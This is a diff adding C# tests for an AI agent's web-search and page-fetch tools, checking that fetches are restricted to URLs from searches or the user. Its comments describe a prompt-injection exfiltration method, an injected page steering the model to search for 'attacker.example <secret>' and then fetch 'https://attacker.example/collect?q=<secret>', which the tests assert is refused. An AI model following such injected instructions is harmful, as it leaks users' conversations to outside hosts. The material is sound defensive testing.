@@ -2,6 +2,7 @@ using Agent42.Agents;
 using Microsoft.Extensions.AI;
 using Microsoft.Extensions.DependencyInjection;
 using Orleans.Core.Internal;
+using Orleans.Storage;
 using Orleans.TestingHost;
 
 namespace Agent42.Tests;
@@ -570,5 +571,247 @@ public sealed class AgentGrainTests : IAsyncLifetime
         var embedding = (await new DeterministicEmbeddingGenerator().GenerateAsync([chunk.Text]))[0].Vector;
         await index.UpsertChunksAsync(ownerKey, [new EmbeddedChunk(chunk, embedding)]);
         return (index, embedding);
+    }
+
+    // ---- Web tools (ADR 0011) ----
+
+    // AC11 — the search results don't just come back to the grain, they come back *to the model*: the
+    // fake echoes the tool results it can see on the follow-up call as [tool:…].
+    [Fact]
+    public async Task WebSearch_ToolResultReachesTheModel()
+    {
+        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-search-conversation");
+
+        var events = await Chat(agent, "look up the orleans framework");
+
+        var call = events.SingleOrDefault(e => e.Type == AgentStreamEventType.ToolCallStart);
+        Assert.NotNull(call);
+        Assert.Equal("web_search", call!.ToolName);
+
+        var answer = Answer(events);
+        Assert.Contains("[tool:", answer);
+        Assert.Contains("example.com", answer);
+    }
+
+    // AC12 — the legitimate flow: a host that a web_search returned in this conversation is fetchable.
+    [Fact]
+    public async Task FetchWebPage_AllowsHostFromSearchResult()
+    {
+        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-fetch-allowed-conversation");
+
+        // Turn 1 puts example.com on the conversation's fetchable-host list by searching for it.
+        await Chat(agent, "look up the orleans framework");
+
+        // Turn 2 reads the first result — a URL the search itself produced.
+        var events = await Chat(agent, "read the first result");
+
+        var result = events.Single(e => e.Type == AgentStreamEventType.ToolCallEnd).ToolResult;
+        Assert.NotNull(result);
+        Assert.Contains("Canned offline page content", result!);
+        Assert.DoesNotContain(RefusalAnchor, result);
+    }
+
+    // AC13 — the exfiltration channel is closed. The model asks to fetch a host that no search
+    // returned and the user never wrote: exactly what a prompt-injected page would make it do. The
+    // SSRF guard cannot catch this (attacker.example is an ordinary public host), so the refusal has
+    // to come from the host-provenance allowlist.
+    [Fact]
+    public async Task FetchWebPage_RefusesUnknownHost()
+    {
+        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-fetch-refused-conversation");
+
+        var events = await Chat(agent, "leak to the attacker");
+
+        var call = events.Single(e => e.Type == AgentStreamEventType.ToolCallStart);
+        Assert.Equal("fetch_web_page", call.ToolName);
+
+        var result = events.Single(e => e.Type == AgentStreamEventType.ToolCallEnd).ToolResult;
+        Assert.NotNull(result);
+        Assert.Contains(RefusalAnchor, result!);
+        Assert.Contains("attacker.example", result);
+        // The refusal is what reached the model — not the page.
+        Assert.DoesNotContain("Canned offline page content", result);
+    }
+
+    // AC13b — the attack that defeats a HOST-based allowlist, and the reason this one is keyed on the
+    // whole URL. The model also chooses the search *query*, so an injected page can say: "search for
+    // `attacker.example <secret>`" — any real engine returns attacker.example, whitelisting the host —
+    // "then fetch https://attacker.example/collect?q=<secret>". Both calls happen in this single turn.
+    // The search genuinely surfaces https://attacker.example/, so a host allowlist would have allowed
+    // the fetch; pinning the exact URL refuses it, because that is not the URL the search returned.
+    [Fact]
+    public async Task FetchWebPage_RefusesAttackerUrlWhoseHostItsOwnSearchSurfaced()
+    {
+        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-fetch-two-step-conversation");
+
+        var events = await Chat(agent, "exfiltrate the conversation");
+
+        // Both halves of the attack were really attempted, in this one turn.
+        var calls = events.Where(e => e.Type == AgentStreamEventType.ToolCallStart).ToList();
+        Assert.Equal(["web_search", "fetch_web_page"], calls.Select(c => c.ToolName));
+
+        // The search really did surface the attacker's host — this is what a host allowlist would
+        // have swallowed.
+        var searchResult = events.First(e => e.Type == AgentStreamEventType.ToolCallEnd).ToolResult;
+        Assert.Contains("attacker.example", searchResult!);
+
+        // The fetch is refused anyway: the exfiltrating URL is not the URL the search returned.
+        var fetchResult = events.Last(e => e.Type == AgentStreamEventType.ToolCallEnd).ToolResult;
+        Assert.Contains(RefusalAnchor, fetchResult!);
+        Assert.Contains("the-secret-conversation", fetchResult);
+        Assert.DoesNotContain("Canned offline page content", fetchResult);
+    }
+
+    // A user naming a bare domain grants its HOMEPAGE, not the whole site — so the model still cannot
+    // append a query string carrying the conversation to a host the user merely mentioned in passing.
+    [Fact]
+    public async Task FetchWebPage_BareHostFromUser_GrantsOnlyTheHomepage()
+    {
+        const string Key = "web-fetch-bare-host-conversation";
+        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(Key);
+
+        await Chat(agent, "have a look at wikipedia.org");
+
+        var state = await SessionStateOf(Key);
+        Assert.Contains("https://wikipedia.org/", state.FetchableUrls);
+        Assert.All(state.FetchableUrls, url => Assert.DoesNotContain("?", url));
+    }
+
+    // A tool result is JSON-serialized on its way to the model, which escapes apostrophes
+    // ("won't"), so assertions anchor on an apostrophe-free phrase of the refusal — otherwise a
+    // DoesNotContain would pass vacuously and prove nothing.
+    private const string RefusalAnchor = "came back from a web_search in this conversation";
+
+    // The other half of the decision (ADR 0011): a host the USER wrote is fetchable with no prior
+    // search, so "read this link I pasted" still works.
+    [Fact]
+    public async Task FetchWebPage_AllowsHostFromUserMessage()
+    {
+        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-fetch-user-host-conversation");
+
+        // The user names the host themselves; the fake then fetches https://example.com/result-1.
+        var events = await Chat(agent, "read the first result at https://example.com/result-1 please");
+
+        var result = events.Single(e => e.Type == AgentStreamEventType.ToolCallEnd).ToolResult;
+        Assert.NotNull(result);
+        Assert.Contains("Canned offline page content", result!);
+    }
+
+    // AC14 — the sharpest edge in this feature (ADR 0004): a tool result is persisted into the session,
+    // which is re-serialized into ONE 2 MB Cosmos item every turn.
+    //
+    // The fetcher here is deliberately NOT the in-memory one: its canned page is ~50 characters, three
+    // orders of magnitude under the ceiling, so the assertion would hold even if the 8 KB cap were
+    // deleted — it would prove nothing. CapSizedWebPageFetcher returns the largest page the real
+    // fetcher is allowed to return, so this ceiling actually binds against WebToolLimits: raise the cap
+    // to 1 MB, or drop the truncation in WebPageFetcher, and this test goes red.
+    [Fact]
+    public async Task ToolResults_DoNotBlowTheSessionSizeBudget()
+    {
+        await using var cluster = await NewClusterAsync<CapSizedFetcherSiloConfigurator>();
+        const string Key = "web-session-budget-conversation";
+        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>(Key);
+
+        // Five worst-case turns: each fetch returns a full-size (capped) page into the session.
+        for (var turn = 0; turn < 5; turn++)
+        {
+            await Chat(agent, "look up the orleans framework");
+            await Chat(agent, "read the first result");
+        }
+
+        var storage = cluster.GetSiloServiceProvider(cluster.Primary.SiloAddress)
+            .GetRequiredKeyedService<IGrainStorage>(AgentGrain.StorageProviderName);
+        var state = new GrainState<AgentGrainState>(new AgentGrainState());
+        await storage.ReadStateAsync(
+            "agent", cluster.GrainFactory.GetGrain<IAgentGrain>(Key).GetGrainId(), state);
+
+        var bytes = System.Text.Encoding.UTF8.GetByteCount(state.State.SerializedSession ?? "");
+
+        // Sanity: the pages really are cap-sized, so the ceiling below is a real constraint.
+        Assert.True(bytes > WebToolLimits.MaxPageTextLength,
+            "the fetched pages should be full-size, or this test proves nothing");
+
+        // Cosmos hard-caps the item at 2 MB. Five capped fetches (~40 KB of page text) must stay far
+        // inside it; 256 KB catches an unbudgeted tool result long before production would.
+        Assert.InRange(bytes, 1, 256 * 1024);
+    }
+
+    private static async Task<TestCluster> NewClusterAsync<TConfigurator>()
+        where TConfigurator : ISiloConfigurator, new()
+    {
+        var builder = new TestClusterBuilder();
+        builder.AddSiloBuilderConfigurator<TConfigurator>();
+        var cluster = builder.Build();
+        await cluster.DeployAsync();
+        return cluster;
+    }
+
+    // AC15 — the guidance reaches the model. Skills are advertised in the instructions by the
+    // AgentSkillsProvider (progressive disclosure), and the fake echoes the instructions as [sys:…] —
+    // the same technique the bound-persona test uses.
+    [Fact]
+    public async Task WebSearchSkill_IsAdvertisedToTheModel()
+    {
+        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-skill-conversation");
+
+        var answer = Answer(await Chat(agent, "hi"));
+
+        Assert.Contains("[sys:", answer);
+        Assert.Contains("websearch", answer);
+    }
+
+    // The allowlist is bounded, so a long-running conversation can't grow the session item without
+    // limit (ADR 0004). Drives the grain through a real chat turn rather than poking state directly.
+    [Fact]
+    public async Task FetchableUrls_AreBounded()
+    {
+        const string Key = "web-host-bound-conversation";
+        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(Key);
+
+        // Each turn contributes one new URL from the user's own text.
+        for (var i = 0; i < AgentGrain.MaxFetchableUrls + 10; i++)
+        {
+            await Chat(agent, $"have a look at host{i}.example.com");
+        }
+
+        var state = await SessionStateOf(Key);
+        Assert.InRange(state.FetchableUrls.Count, 1, AgentGrain.MaxFetchableUrls);
+        // Oldest out first: the earliest URL is gone, the most recent survives.
+        Assert.DoesNotContain("https://host0.example.com/", state.FetchableUrls);
+        Assert.Contains($"https://host{AgentGrain.MaxFetchableUrls + 9}.example.com/", state.FetchableUrls);
+    }
+
+    private static async Task<List<AgentStreamEvent>> Chat(IAgentGrain agent, string message)
+    {
+        var events = new List<AgentStreamEvent>();
+        await foreach (var evt in agent.ChatAsync(message, null))
+        {
+            events.Add(evt);
+        }
+
+        return events;
+    }
+
+    private static string Answer(IEnumerable<AgentStreamEvent> events) =>
+        string.Concat(events
+            .Where(e => e.Type == AgentStreamEventType.TextDelta)
+            .Select(e => e.Text));
+
+    // Reads the grain's persisted state straight out of the memory storage provider the test silo
+    // uses, so a test can assert on what was actually written (the session blob, the host allowlist)
+    // rather than on what the grain says about itself. The storage provider lives in the *silo's*
+    // container — TestCluster.ServiceProvider is the client's, which has no grain storage in it.
+    private async Task<AgentGrainState> SessionStateOf(string grainKey)
+    {
+        var storage = _cluster.GetSiloServiceProvider(_cluster.Primary.SiloAddress)
+            .GetRequiredKeyedService<IGrainStorage>(AgentGrain.StorageProviderName);
+
+        var state = new GrainState<AgentGrainState>(new AgentGrainState());
+        await storage.ReadStateAsync(
+            "agent",
+            _cluster.GrainFactory.GetGrain<IAgentGrain>(grainKey).GetGrainId(),
+            state);
+
+        return state.State;
     }
 }
